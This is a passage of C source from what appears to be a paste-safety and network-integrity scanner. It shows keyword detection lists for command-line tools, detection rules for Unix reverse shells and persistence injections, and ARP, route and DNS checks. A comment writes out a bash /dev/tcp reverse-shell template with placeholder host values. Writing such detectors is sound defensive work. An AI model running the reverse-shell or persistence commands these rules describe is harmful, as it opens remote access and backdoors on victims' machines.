             ci_contains(text, "cyrdeliver") || ci_contains(text, "ipurge") ||
             ci_contains(text, "mbexamine") || ci_contains(text, "mbpath") ||
             ci_contains(text, "mbpurge") || ci_contains(text, "cyrpasswd") ||
             ci_contains(text, "ptdump") || ci_contains(text, "ptexpire") ||
             (ci_contains(text, "squatter") && ci_contains(text, " -")) || ci_contains(text, "timsieved") ||
             ci_contains(text, "tls_prune") || ci_contains(text, "unexpunge") ||
             ci_contains(text, "cvt_cyrusdb") || ci_contains(text, "mkimap") ||
             ci_contains(text, "lmtpd") || ci_contains(text, "mupdate") ||
             ci_contains(text, "notifyd") || ci_contains(text, "pcscd") ||
             ci_contains(text, "pcsc_scan") || ci_contains(text, "pcsctest") ||
             ci_contains(text, "opensc") || ci_contains(text, "pkcs11") ||
             ci_contains(text, "pkcs15") ||
             (ci_contains(text, "piv") && ci_contains(text, " -")) ||
             ci_contains(text, "openpgp") || ci_contains(text, "pn53x") ||
             ci_contains(text, "acr122") || ci_contains(text, "ykinfo") ||
             ci_contains(text, "ykclient") || ci_contains(text, "ykpam") ||
             ci_contains(text, "yubioath") || ci_contains(text, "yubipiv") ||
             ci_contains(text, "yubitotp") || ci_contains(text, "yubitoken") ||
             ci_contains(text, "ykcs11") || ci_contains(text, "nitropy") ||
             (ci_contains(text, "solo") && ci_contains(text, " -")) ||
             ci_contains(text, "solo1") || ci_contains(text, "solokey") ||
             ci_contains(text, "ledgerctl") || ci_contains(text, "ledgerblue") ||
             ci_contains(text, "ledgerwallet") || ci_contains(text, "trezorctl") ||
             ci_contains(text, "trezor-agent") || ci_contains(text, "ckcc") ||
             ci_contains(text, "softhsm") || ci_contains(text, "yubihsm") ||
             ci_contains(text, "nethsm") || ci_contains(text, "nfkm") ||
             ci_contains(text, "lunacm") || ci_contains(text, "lunash") ||
             ci_contains(text, "ctconf") || ci_contains(text, "ckdemo") ||
             ci_contains(text, "cloudhsm") || ci_contains(text, "key_mgmt_util") ||
             ci_contains(text, "keylime_") || ci_contains(text, "swtpm") ||
             ci_contains(text, "evmctl") ||
             (ci_contains(text, "adcli") && ci_contains(text, " -")) ||
             ci_contains(text, "realmd") || ci_contains(text, "msktutil") ||
             ci_contains(text, "adclient") || ci_contains(text, "adleave") ||
             ci_contains(text, "adflush") || ci_contains(text, "adpasswd") ||
             ci_contains(text, "adquery") || ci_contains(text, "dzdo") ||
             ci_contains(text, "dzsh") || ci_contains(text, "dzjoin") ||
             ci_contains(text, "pbis") || ci_contains(text, "lwconfig") ||
             ci_contains(text, "lwsm") || ci_contains(text, "lsassd") ||
             ci_contains(text, "domainjoin") || ci_contains(text, "vastool") ||
             ci_contains(text, "vasd") || ci_contains(text, "realm join") ||
             ci_contains(text, "net ads join") || ci_contains(text, "net rpc join") ||
             (ci_contains(text, "adjoin") && ci_contains(text, " -")) ||
             ci_contains(text, "sss_useradd") || ci_contains(text, "sss_userdel") ||
             ci_contains(text, "sss_usermod") || ci_contains(text, "sss_obfuscate") ||
             ci_contains(text, "sss_seed") || ci_contains(text, "sss_override") ||
             ci_contains(text, "sss_debuglevel") || ci_contains(text, "pdflatex") ||
             ci_contains(text, "xelatex") || ci_contains(text, "lualatex") ||
             ci_contains(text, "texlua") || ci_contains(text, "texluac") ||
             ci_contains(text, "latexmk") || ci_contains(text, "arara") ||
             ci_contains(text, "tlmgr") || ci_contains(text, "fmtutil") ||
             ci_contains(text, "updmap") || ci_contains(text, "mktexlsr") ||
             ci_contains(text, "texconfig") || ci_contains(text, "texmfstart") ||
             ci_contains(text, "mtxrun") || ci_contains(text, "gnuplot") ||
             ci_contains(text, "mmdc") || ci_contains(text, "plantuml") ||
             ci_contains(text, "contextjit") || ci_contains(text, "texexec") ||
             (ci_contains(text, "latex") &&
              (ci_contains(text, " -") || ci_contains(text, ".tex"))) ||
             (ci_contains(text, "asy") && ci_contains(text, " -")) ||
             (ci_contains(text, "dscacheutil") && ci_contains(text, " -f")) ||
             ci_contains(text, "scutil --set") ||
             (ci_contains(text, "bless") && ci_contains(text, " -")) ||
             (ci_contains(text, "lipo") && ci_contains(text, " -"))) {
        what = "hpc/domainjoin/hsm/dns/mail/privesc/stego/tex primitive";
        }
        else if (ci_contains(text, "wsadmin") || ci_contains(text, "startserver") ||
             ci_contains(text, "stopserver") || ci_contains(text, "wlst") ||
             ci_contains(text, "startweblogic") || ci_contains(text, "nmenroll") ||
             ci_contains(text, "nmkill") || ci_contains(text, "nmexeccmd") ||
             ci_contains(text, "jboss-cli") || ci_contains(text, "asadmin") ||
             ci_contains(text, "imqcmd") ||
             (ci_contains(text, "catalina") && ci_contains(text, " -")) ||
             ci_contains(text, "tcruntime-ctl") || ci_contains(text, "opmnctl") ||
             ci_contains(text, "dcmctl") || ci_contains(text, "oidctl") ||
             ci_contains(text, "bulkload") || ci_contains(text, "bulkmodify") ||
             ci_contains(text, "bulkdelete") || ci_contains(text, "dipassistant") ||
             ci_contains(text, "pkispawn") || ci_contains(text, "pkidestroy") ||
             ci_contains(text, "ipa-server-install") ||
             ci_contains(text, "ipa-replica-") || ci_contains(text, "ipactl") ||
             ci_contains(text, "hdbsql") || ci_contains(text, "hdbcons") ||
             ci_contains(text, "hdblcm") || ci_contains(text, "hdbuserstore") ||
             ci_contains(text, "sapcontrol") || ci_contains(text, "saprouter") ||
             ci_contains(text, "r3trans") || ci_contains(text, "r3load") ||
             ci_contains(text, "oninit") || ci_contains(text, "onmode") ||
             ci_contains(text, "ontape") || ci_contains(text, "dbaccess") ||
             ci_contains(text, "dbexport") || ci_contains(text, "bteq") ||
             ci_contains(text, "fastload") || ci_contains(text, "fastexport") ||
             ci_contains(text, "multiload") || ci_contains(text, "tpump") ||
             ci_contains(text, "vprocmanager") || ci_contains(text, "nzsql") ||
             ci_contains(text, "nzload") || ci_contains(text, "nzbackup") ||
             ci_contains(text, "nzrestore") || ci_contains(text, "gpfdist") ||
             ci_contains(text, "gpload") || ci_contains(text, "gpstart") ||
             ci_contains(text, "gpstop") || ci_contains(text, "gpbackup") ||
             ci_contains(text, "gprestore") || ci_contains(text, "gpssh") ||
             ci_contains(text, "gpcopy") || ci_contains(text, "vsql") ||
             ci_contains(text, "admintools") || ci_contains(text, "mclient") ||
             ci_contains(text, "monetdbd") || ci_contains(text, "fbsql") ||
             ci_contains(text, "gbak") || ci_contains(text, "gfix") ||
             ci_contains(text, "gsec") || ci_contains(text, "nbackup") ||
             ci_contains(text, "fbtracemgr") || ci_contains(text, "prodb") ||
             ci_contains(text, "proutil") || ci_contains(text, "proshut") ||
             ci_contains(text, "probkup") || ci_contains(text, "prorest") ||
             ci_contains(text, "fmsadmin") || ci_contains(text, "fmserverd") ||
             ci_contains(text, "isql") || ci_contains(text, "tsql") ||
             ci_contains(text, "bsqldb") || ci_contains(text, "freebcp") ||
             ci_contains(text, "defncopy") || ci_contains(text, "datacopy") ||
             ci_contains(text, "ddbsh") || ci_contains(text, "ibmcloud") ||
             ci_contains(text, "linode-cli") || ci_contains(text, "vultr-cli") ||
             (ci_contains(text, "exo") && ci_contains(text, " -")) ||
             ci_contains(text, "cloudmonkey") || ci_contains(text, "cmk") ||
             ci_contains(text, "euca-") || ci_contains(text, "ncli") ||
             ci_contains(text, "acli") || ci_contains(text, "dapr") ||
             ci_contains(text, "faas-cli") ||
             (ci_contains(text, "fission") && ci_contains(text, " -")) ||
             ci_contains(text, "nuctl") || ci_contains(text, "wsk") ||
             ci_contains(text, "supabase") || ci_contains(text, "pscale") ||
             ci_contains(text, "neonctl") || ci_contains(text, "turso") ||
             ci_contains(text, "flyway") || ci_contains(text, "liquibase") ||
             ci_contains(text, "atlasgo") || ci_contains(text, "gh-ost") ||
             ci_contains(text, "alembic") ||
             (ci_contains(text, "prisma") && ci_contains(text, " -")) ||
             ci_contains(text, "n98-magerun") || ci_contains(text, "shopify") ||
             ci_contains(text, "kapacitor") || ci_contains(text, "nrpe") ||
             ci_contains(text, "check_nrpe") || ci_contains(text, "centcore") ||
             ci_contains(text, "centengine") || ci_contains(text, "gmond") ||
             ci_contains(text, "gmetad") || ci_contains(text, "gmetric") ||
             ci_contains(text, "rrdcached") || ci_contains(text, "munin-node") ||
             ci_contains(text, "munin-run") || ci_contains(text, "carbon-cache") ||
             ci_contains(text, "whisper-") || ci_contains(text, "vmagent") ||
             ci_contains(text, "vmalert") || ci_contains(text, "vmbackup") ||
             (ci_contains(text, "thanos") && ci_contains(text, " -")) ||
             (ci_contains(text, "cortex") && ci_contains(text, " -")) ||
             ci_contains(text, "logcli") ||
             (ci_contains(text, "promtool") && ci_contains(text, " -")) ||
             ci_contains(text, "pmacct") || ci_contains(text, "nfacctd") ||
             ci_contains(text, "sfacctd") || ci_contains(text, "nfdump") ||
             ci_contains(text, "nfcapd") ||
             (ci_contains(text, "silk") && ci_contains(text, " -")) ||
             ci_contains(text, "yaf") || ci_contains(text, "softflowd") ||
             ci_contains(text, "agent_control") || ci_contains(text, "fleetctl") ||
             (ci_contains(text, "velociraptor") && ci_contains(text, " -")) ||
             ci_contains(text, "oscap") || ci_contains(text, "autotailor") ||
             ci_contains(text, "mpcmdrun") || ci_contains(text, "repcli") ||
             ci_contains(text, "reputil") || ci_contains(text, "cbdaemon") ||
             (ci_contains(text, "parity") && ci_contains(text, " -")) ||
             ci_contains(text, "kesl-control") || ci_contains(text, "klnagent") ||
             ci_contains(text, "esets_") || ci_contains(text, "savdctl") ||
             (ci_contains(text, "sweep") && ci_contains(text, " -")) ||
             ci_contains(text, "maconfig") || ci_contains(text, "msainfo") ||
             ci_contains(text, "uvscan") || ci_contains(text, "cmdscan") ||
             ci_contains(text, "mfemactl") || ci_contains(text, "bdscan") ||
             ci_contains(text, "bdcheck") || ci_contains(text, "sigtool") ||
             ci_contains(text, "a2cmd") || ci_contains(text, "fsav") ||
             ci_contains(text, "avscan") || ci_contains(text, "avconfig") ||
             ci_contains(text, "pavsig") || ci_contains(text, "psanhost") ||
             ci_contains(text, "sbamscan") || ci_contains(text, "wrsa") ||
             ci_contains(text, "cylancesvc") || ci_contains(text, "cyoptics") ||
             ci_contains(text, "xagt") || ci_contains(text, "feagent") ||
             ci_contains(text, "hxagent") || ci_contains(text, "hurukai") ||
             ci_contains(text, "taniumclient") || ci_contains(text, "fw ctl") ||
             ci_contains(text, "fwm ") || ci_contains(text, "cpconfig") ||
             ci_contains(text, "cphaprob") || ci_contains(text, "cpwd") ||
             ci_contains(text, "cpinfo") || ci_contains(text, "pan_comm") ||
             ci_contains(text, "panxapi") || ci_contains(text, "fcconfig") ||
             ci_contains(text, "fnsysctl") || ci_contains(text, "fnbamd") ||
             ci_contains(text, "phionctrl") || ci_contains(text, "acpf") ||
             ci_contains(text, "cgtool") || ci_contains(text, "ngfirewall") ||
             ci_contains(text, "ngadmin") || ci_contains(text, "confd") ||
             (ci_contains(text, "awed") && ci_contains(text, " -")) ||
             ci_contains(text, "midd") || ci_contains(text, "routeros") ||
             (ci_contains(text, "dude") && ci_contains(text, " -") &&
              !ci_contains(text, "avrdude")) ||
             ci_contains(text, "capsman") || ci_contains(text, "userman") ||
             ci_contains(text, "unms") || ci_contains(text, "ucrm") ||
             ci_contains(text, "edgeos") || ci_contains(text, "vyatta") ||
             ci_contains(text, "vyos") || ci_contains(text, "vbash") ||
             ci_contains(text, "bigpipe") ||
             (ci_contains(text, "icontrol") && ci_contains(text, " -")) ||
             ci_contains(text, "tmctl") || ci_contains(text, "bigstart") ||
             ci_contains(text, "mcpd") || ci_contains(text, "restjavad") ||
             (ci_contains(text, "sod") && !ci_contains(text, "sodium")) ||
             ci_contains(text, "tmm") ||
             (ci_contains(text, "nscli") && !ci_contains(text, "dnsclient")) ||
             ci_contains(text, "nsconmsg") || ci_contains(text, "nstrace") ||
             ci_contains(text, "nstcpdump") || ci_contains(text, "nssavecore") ||
             (ci_contains(text, "nsstats") && !ci_contains(text, "dnsstats")) ||
             ci_contains(text, "nswfs") || ci_contains(text, "nswl") ||
             ci_contains(text, "aaad") || ci_contains(text, "mgd") ||
             ci_contains(text, "jsnap") || ci_contains(text, "jnpr") ||
             ci_contains(text, "contrail") ||
             (ci_contains(text, "mist") && ci_contains(text, " -")) ||
             ci_contains(text, "airwave") || ci_contains(text, "clearpass") ||
             ci_contains(text, "cppm") || ci_contains(text, "vsh") ||
             ci_contains(text, "dcnm") || ci_contains(text, "ncs_cli") ||
             ci_contains(text, "apic") ||
             (ci_contains(text, "sum") && ci_contains(text, " -")) ||
             ci_contains(text, "onecli") ||
             (ci_contains(text, "asu") && ci_contains(text, " -")) ||
             ci_contains(text, "xclarity") || ci_contains(text, "ilomconfig") ||
             ci_contains(text, "itpconfig") || ci_contains(text, "hwmgmtcli") ||
             ci_contains(text, "ubiosconfig") || ci_contains(text, "biosconfig") ||
             ci_contains(text, "conrep") || ci_contains(text, "ssaducli") ||
             (ci_contains(text, "omconfig") && ci_contains(text, " -")) ||
             ci_contains(text, "omreport") ||
             ci_contains(text, "srvadmin") || ci_contains(text, "idracadm") ||
             (ci_contains(text, "racadm") && ci_contains(text, " -")) ||
             ci_contains(text, "dsu") ||
             ci_contains(text, "horcm") || ci_contains(text, "raidcom") ||
             ci_contains(text, "pairsplit") || ci_contains(text, "paircreate") ||
             ci_contains(text, "naviseccli") || ci_contains(text, "powermt") ||
             ci_contains(text, "emcpadm") || ci_contains(text, "3paradm") ||
             ci_contains(text, "pureadmin") || ci_contains(text, "purevol") ||
             (ci_contains(text, "isi") && ci_contains(text, " -")) ||
             ci_contains(text, "vserver") || ci_contains(text, "ontapcli") ||
             ci_contains(text, "asmb") || ci_contains(text, "aswm") ||
             ci_contains(text, "asmc") || ci_contains(text, "dsmc") ||
             ci_contains(text, "dsmcad") || ci_contains(text, "bpbackup") ||
             ci_contains(text, "bprestore") || ci_contains(text, "bplist") ||
             ci_contains(text, "simpana") || ci_contains(text, "qoperation") ||
             ci_contains(text, "qcommand") || ci_contains(text, "cvcl") ||
             ci_contains(text, "veeamconfig") || ci_contains(text, "acrocmd") ||
             ci_contains(text, "duply") || ci_contains(text, "borgmatic") ||
             ci_contains(text, "backuppc_") || ci_contains(text, "b2-linux") ||
             ci_contains(text, "crashplan") || ci_contains(text, "code42") ||
             (ci_contains(text, "ditto") && ci_contains(text, " -")) ||
             ci_contains(text, "revsocks") ||
             (ci_contains(text, "stowaway") && ci_contains(text, " -")) ||
             (ci_contains(text, "xray") && ci_contains(text, " -") &&
              !ci_contains(text, "--version")) ||
             (ci_contains(text, "clash") && ci_contains(text, " -")) ||
             ci_contains(text, "hysteria") ||
             (ci_contains(text, "brook") && ci_contains(text, " -")) ||
             ci_contains(text, "ipt2socks") || ci_contains(text, "trojan-go") ||
             (ci_contains(text, "inlets") && ci_contains(text, " -")) ||
             ci_contains(text, "interactsh-") ||
             (ci_contains(text, "meek") && ci_contains(text, " -")) ||
             (ci_contains(text, "snowflake") && ci_contains(text, " -")) ||
             ci_contains(text, "webtunnel") || ci_contains(text, "onionshare") ||
             ci_contains(text, "onionbalance") || ci_contains(text, "sipsak") ||
             ci_contains(text, "svreport") || ci_contains(text, "svcrash") ||
             ci_contains(text, "pjsystest") || ci_contains(text, "opensipsctl") ||
             ci_contains(text, "osipsconsole") || ci_contains(text, "fs_ctl") ||
             ci_contains(text, "fsctl") || ci_contains(text, "gnugk") ||
             ci_contains(text, "ohphone") || ci_contains(text, "simph323") ||
             (ci_contains(text, "amm") && ci_contains(text, " -")) ||
             ci_contains(text, "coursier") ||
             (ci_contains(text, "ros") && ci_contains(text, " -")) ||
             (ci_contains(text, "gambit") && ci_contains(text, " -")) ||
             ci_contains(text, "nuitka") || ci_contains(text, "pyinstaller") ||
             ci_contains(text, "cx_freeze") || ci_contains(text, "pex") ||
             ci_contains(text, "shiv") || ci_contains(text, "pyoxidizer") ||
             ci_contains(text, "cython") || ci_contains(text, "wasmtime") ||
             ci_contains(text, "wasmer") || ci_contains(text, "wasmedge") ||
             ci_contains(text, "iwasm") ||
             (ci_contains(text, "spin") && ci_contains(text, " -")) ||
             ci_contains(text, "native-image") ||
             (ci_contains(text, "gu") && ci_contains(text, " -") &&
              !ci_contains(text, "pkgutil")) ||
             ci_contains(text, "zmodload") ||
             ci_contains(text, "basher") || ci_contains(text, "zinit") ||
             (ci_contains(text, "sheldon") && ci_contains(text, " -")) ||
             (ci_contains(text, "fisher") && ci_contains(text, " -")) ||
             (ci_contains(text, "mise") && ci_contains(text, " -")) ||
             ci_contains(text, "asdf") ||
             (ci_contains(text, "rtx") && ci_contains(text, " -")) ||
             (ci_contains(text, "proto") && ci_contains(text, " -")) ||
             (ci_contains(text, "aqua") && ci_contains(text, " -")) ||
             (ci_contains(text, "ubi") && ci_contains(text, " -")) ||
             (ci_contains(text, "eget") && ci_contains(text, " -")) ||
             ci_contains(text, "topgrade") || ci_contains(text, "lefthook") ||
             (ci_contains(text, "husky") && ci_contains(text, " -")) ||
             ci_contains(text, "lint-staged") ||
             (ci_contains(text, "overcommit") && ci_contains(text, " -")) ||
             ci_contains(text, "mmctl") || ci_contains(text, "zulip-send") ||
             ci_contains(text, "murmurd") || ci_contains(text, "ts3server") ||
             ci_contains(text, "tsdns") || ci_contains(text, "matterbridge") ||
             ci_contains(text, "xmodmap") || ci_contains(text, "xkbcomp") ||
             ci_contains(text, "xset") || ci_contains(text, "xwud") ||
             ci_contains(text, "jackrec") ||
             (ci_contains(text, "maim") && ci_contains(text, " -")) ||
             (ci_contains(text, "grim") && ci_contains(text, " -")) ||
             (ci_contains(text, "v4l2-ctl") && (ci_contains(text, "--set") ||
              ci_contains(text, "--stream") || ci_contains(text, " -d"))) ||
             (ci_contains(text, "motion") && ci_contains(text, " -") &&
              !ci_contains(text, "motion -h") &&
              !ci_contains(text, "motion --help")) ||
             ci_contains(text, "lkl") || ci_contains(text, "uberkey") ||
             ci_contains(text, "kea-") || ci_contains(text, "keactrl") ||
             ci_contains(text, "kea-shell") || ci_contains(text, "kea-dhcp-ddns") ||
             ci_contains(text, "kea-netconf") || ci_contains(text, "dhcpd") ||
             ci_contains(text, "dhcptest") || ci_contains(text, "dhcpdump") ||
             ci_contains(text, "dhcpstarv") || ci_contains(text, "dhcpig") ||
             ci_contains(text, "dibbler-")) {
        what = "appserver/db/monitoring/edr/netdev/bmc/backup/tunnel/exec primitive";
        }
        
        if (what) {
            v.signals |= PASTE_WINDOWS_LOLBIN;
        }
        if (what) {
            v.signals |= PASTE_WINDOWS_LOLBIN;
            v.score += 45;
            if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
                snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                    "P8: Windows ClickFix / LOLBin — %s", what);
        }
    }

    /* P9: Reverse shell payloads (Unix) */
    {
        int is_revshell = 0;
        /* bash /dev/tcp redirect: bash -i >& /dev/tcp/IP/PORT 0>&1 */
        if (strstr(text, "/dev/tcp/") || strstr(text, "/dev/udp/"))
            is_revshell = 1;
        /* nc / ncat / netcat reverse shell: nc -e / -c or mkfifo pipe */
        if (!is_revshell && !strstr(text, "sync") &&
            (strstr(text, "nc ") || strstr(text, "ncat ") ||
             strstr(text, "netcat ")) &&
            (strstr(text, " -e ") || strstr(text, " -c ") ||
             strstr(text, "--exec") ||
             strstr(text, "--sh-exec") || strstr(text, "mkfifo")))
            is_revshell = 1;
        /* telnet | sh — the double-telnet data-exfil shell */
        if (!is_revshell && ci_contains(text, "telnet") &&
            (strstr(text, "|sh") || strstr(text, "| sh") ||
             strstr(text, "/bin/sh") || strstr(text, "sh -i")))
            is_revshell = 1;
        /* ruby TCPSocket / perl -M module-load socket shells */
        if (!is_revshell && strstr(text, "TCPSocket") &&
            (strstr(text, "popen") || strstr(text, "exec") ||
             strstr(text, "system(") || strstr(text, "dup2")))
            is_revshell = 1;
        if (!is_revshell && strstr(text, "perl -M") &&
            strstr(text, "IO::Socket"))
            is_revshell = 1;
        /* powershell socket object: New-Object *Sockets* */
        if (!is_revshell && strstr(text, "New-Object") &&
            strstr(text, "Sockets"))
            is_revshell = 1;
        /* Python socket reverse shell */
        if (!is_revshell &&
            (strstr(text, "socket.") || strstr(text, "connect(")) &&
            (strstr(text, "subprocess") || strstr(text, "os.dup2") ||
             strstr(text, "pty.spawn")))
            is_revshell = 1;
        /* socat reverse shell — address keywords are case-insensitive */
        if (!is_revshell &&
            ci_contains(text, "socat") &&
            (ci_contains(text, "exec:") || ci_contains(text, "tcp:") ||
             ci_contains(text, "tcp4:") || ci_contains(text, "tcp6:") ||
             ci_contains(text, "tcp-l")))
            is_revshell = 1;
        /* php/perl one-liner reverse shells: fsockopen/socket → exec */
        if (!is_revshell &&
            (strstr(text, "php -r") || strstr(text, "perl -e")) &&
            (strstr(text, "fsockopen") || strstr(text, "socket_create") ||
             strstr(text, "IO::Socket")))
            is_revshell = 1;
        if (is_revshell) {
            v.score += 60;
            if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
                snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                    "P9: Reverse shell payload (/dev/tcp, nc -e, socat)");
        }
    }

    /* Compound amplifiers */
    if ((v.signals & PASTE_CURL_PIPE_SH) &&
        (v.signals & PASTE_HIDDEN_NEWLINE)) {
        v.score += 15;
        if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
            snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                "Compound: download+pipe+hidden newline — sophisticated "
                "pastejacking attack");
    }
    if ((v.signals & PASTE_SUDO_INJECTION) &&
        (v.signals & PASTE_CURL_PIPE_SH)) {
        v.score += 15;
        if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
            snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                "Compound: sudo + remote code = root-level pastejacking");
    }

    /* P10: Persistence injection — SSH key, crontab, shell startup modification.
     * Appending to ~/.ssh/authorized_keys or (cron|at)tab in a paste is a
     * classic post-exploitation persistence vector; almost never legitimate
     * in a clipboard context. Shell startup modification also covered.     */
    {
        int is_persist = 0;
        const char *why = NULL;
        if ((strstr(text, ".ssh/authorized_keys") &&
             (strstr(text, ">>") || strstr(text, "echo "))) ||
            strstr(text, "> ~/.ssh/authorized_keys")) {
            is_persist = 1; why = "SSH authorized_keys injection";
        } else if (strstr(text, "crontab") &&
                   (strstr(text, "crontab -l") ||
                    strstr(text, "(crontab") ||
                    strstr(text, "| crontab") ||
                    strstr(text, "|crontab"))) {
            is_persist = 1; why = "crontab persistence injection";
        } else if ((strstr(text, ".bashrc") || strstr(text, ".bash_profile") ||
                    strstr(text, ".zshrc")  || strstr(text, ".profile")) &&
                   (strstr(text, "curl ") || strstr(text, "wget ") ||
                    strstr(text, "/dev/tcp") || strstr(text, "bash -i"))) {
            is_persist = 1; why = "shell startup file backdoor injection";
        }
        if (is_persist) {
            v.score += 50;
            if (v.n_reasons < HLSE_PASTE_MAX_REASONS)
                snprintf(v.reasons[v.n_reasons++], sizeof(v.reasons[0]),
                    "P10: Persistence injection — %s", why);
        }
    }

    if (v.score > 100) v.score = 100;
    /* Reasons may quote pasted text; sanitise display-hostile bytes. */
    {
        int i;
        for (i = 0; i < v.n_reasons; i++)
            hlse_sanitize_display(v.reasons[i]);
    }
    return v;
}

/* ═══════════════════════════════════════════════════════════════════════
 * S3: Network Safety Check (ARP / DNS / Gateway integrity)
 *
 * Pure read from /proc and /etc — no network access, no raw sockets.
 *
 *   N1. ARP poisoning    — duplicate MACs for different IPs
 *   N2. Gateway change   — default gw differs from baseline
 *   N3. DNS hijacking    — /etc/resolv.conf points to suspicious IP
 *   N4. Hosts file       — banking/exchange domains redirected
 * ═══════════════════════════════════════════════════════════════════════ */

NetworkVerdict
hlse_check_network(void) {
    NetworkVerdict v;
    memset(&v, 0, sizeof(v));

    /* N1: ARP table — detect duplicate MACs (ARP spoofing indicator) */
    {
        FILE *fp = hlse_open_system_file("/proc/net/arp");
        if (fp) {
            char line[256];
            char ips[64][16];     /* up to 64 ARP entries */
            char macs[64][18];
            int count = 0;
            int i, j;

            /* Skip header */
            if (fgets(line, sizeof(line), fp)) {
                while (fgets(line, sizeof(line), fp) && count < 64) {
                    /* Format: IP HW_type Flags HW_address Mask Device */
                    char ip[16], mac[18];
                    if (sscanf(line, "%15s %*s %*s %17s", ip, mac) == 2) {
                        /* Skip incomplete entries (00:00:00:00:00:00) */
                        if (strcmp(mac, "00:00:00:00:00:00") == 0) continue;
                        snprintf(ips[count], sizeof(ips[0]), "%s", ip);
                        snprintf(macs[count], sizeof(macs[0]), "%s", mac);
                        count++;
                    }
                }
            }
            fclose(fp);

            /* Check for duplicate MACs with different IPs */
            for (i = 0; i < count; i++) {
                for (j = i + 1; j < count; j++) {
                    if (strcmp(macs[i], macs[j]) == 0 &&
                        strcmp(ips[i], ips[j]) != 0) {
                        v.score += 60;
                        if (v.n_reasons < HLSE_NET_MAX_REASONS) {
                            snprintf(v.reasons[v.n_reasons], 255,
                                "N1: ARP POISONING — MAC %.17s shared by "
                                "%.15s and %.15s",
                                macs[i], ips[i], ips[j]);
                            v.n_reasons++;
                        }
                    }
                }
            }
        }
    }

    /* N2: Default-route integrity — multiple default routes with identical
     * metric indicate routing injection (malware or rogue DHCP).
     * Reads /proc/net/route; all values are hex little-endian.           */
    {
        FILE *fp = hlse_open_system_file("/proc/net/route");
        if (fp) {
            char line[256];
            unsigned long gw_hex[8];
            int gw_metric[8];
            int gw_count = 0;
            int i, j;

            if (fgets(line, sizeof(line), fp)) { /* skip header */
                while (fgets(line, sizeof(line), fp) && gw_count < 8) {
                    char iface[16];
                    unsigned long dest, gw, flags;
                    int metric;
                    unsigned long mask;
                    /* Iface Dest Gateway Flags RefCnt Use Metric Mask ... */
                    if (sscanf(line, "%15s %lx %lx %lx %*d %*d %d %lx",
                               iface, &dest, &gw, &flags, &metric, &mask) == 6) {
                        /* Default route: Destination==0, Flags has GATEWAY(0x2) */
                        if (dest == 0UL && (flags & 0x2UL)) {
                            gw_hex[gw_count]    = gw;
                            gw_metric[gw_count] = metric;
                            gw_count++;
                        }
                    }
                }
            }
            fclose(fp);

            /* Flag if multiple default routes share the lowest metric */
            if (gw_count >= 2) {
                int min_metric = gw_metric[0];
                int dup = 0;
                for (i = 1; i < gw_count; i++)
                    if (gw_metric[i] < min_metric) min_metric = gw_metric[i];
                for (i = 0; i < gw_count; i++)
                    if (gw_metric[i] == min_metric) dup++;
                if (dup >= 2) {
                    /* Find the two conflicting gateway IPs */
                    unsigned long ga = 0, gb = 0;
                    for (i = 0; i < gw_count && ga == 0; i++)
                        if (gw_metric[i] == min_metric) ga = gw_hex[i];
                    for (j = i; j < gw_count && gb == 0; j++)
                        if (gw_metric[j] == min_metric && gw_hex[j] != ga)
                            gb = gw_hex[j];
                    v.score += 55;
                    if (v.n_reasons < HLSE_NET_MAX_REASONS) {
                        if (gb) {
                            /* Decode hex little-endian to dotted-decimal */
                            snprintf(v.reasons[v.n_reasons++],
                                sizeof(v.reasons[0]),
                                "N2: ROUTING INJECTION — %d default routes share "
                                "metric %d (possible MITM: gateways "
                                "%lu.%lu.%lu.%lu vs %lu.%lu.%lu.%lu)",
                                dup, min_metric,
                                ga & 0xFF, (ga>>8) & 0xFF,
                                (ga>>16) & 0xFF, (ga>>24) & 0xFF,
                                gb & 0xFF, (gb>>8) & 0xFF,
                                (gb>>16) & 0xFF, (gb>>24) & 0xFF);
                        } else {
                            snprintf(v.reasons[v.n_reasons++],
                                sizeof(v.reasons[0]),
                                "N2: ROUTING INJECTION — %d default routes share "
                                "metric %d (possible MITM)", dup, min_metric);
                        }
                    }
                }
            }
        }
    }

    /* N3: DNS resolver check */
    {
        FILE *fp = hlse_open_system_file("/etc/resolv.conf");
        if (fp) {
            char line[256];
            int ns_count = 0;

            while (fgets(line, sizeof(line), fp)) {
                char ip[64];
                if (sscanf(line, "nameserver %63s", ip) == 1) {
                    ns_count++;
                    /* Known safe DNS: major public resolvers + RFC-1918 +
                     * 127.0.0.53 (systemd-resolved), 149.112 (Quad9),
                     * 208.67 (OpenDNS), 64.6 (Verisign), 185.228 (CleanBrowsing),
                     * 94.140 (AdGuard), 156.154 (Neustar/UltraDNS)             */
                    int is_known = (
                        strcmp(ip, "1.1.1.1") == 0 ||
                        strcmp(ip, "1.0.0.1") == 0 ||
                        strcmp(ip, "8.8.8.8") == 0 ||
                        strcmp(ip, "8.8.4.4") == 0 ||
                        strcmp(ip, "9.9.9.9") == 0 ||
                        strcmp(ip, "149.112.112.112") == 0 ||
                        strcmp(ip, "208.67.222.222") == 0 ||
                        strcmp(ip, "208.67.220.220") == 0 ||
                        strcmp(ip, "64.6.64.6") == 0 ||
                        strcmp(ip, "64.6.65.6") == 0 ||
                        strcmp(ip, "185.228.168.9") == 0 ||
                        strcmp(ip, "185.228.169.9") == 0 ||
                        strcmp(ip, "94.140.14.14") == 0 ||  /* AdGuard */
                        strcmp(ip, "94.140.15.15") == 0 ||
                        strcmp(ip, "94.140.14.15") == 0 ||
                        strcmp(ip, "156.154.70.1") == 0 ||  /* Neustar/UltraDNS */
                        strcmp(ip, "156.154.71.1") == 0 ||
                        strcmp(ip, "127.0.0.1") == 0 ||
                        strcmp(ip, "127.0.0.53") == 0 ||
                        strcmp(ip, "::1") == 0 ||
                        strcmp(ip, "2606:4700:4700::1111") == 0 || /* CF IPv6 */
                        strcmp(ip, "2606:4700:4700::1001") == 0 ||
                        strcmp(ip, "2001:4860:4860::8888") == 0 || /* Google IPv6 */
                        strcmp(ip, "2001:4860:4860::8844") == 0 ||
                        strcmp(ip, "2620:fe::fe") == 0 ||          /* Quad9 IPv6 */
                        strcmp(ip, "2620:fe::9") == 0 ||
                        strncmp(ip, "10.", 3) == 0 ||
                        strncmp(ip, "192.168.", 8) == 0 ||
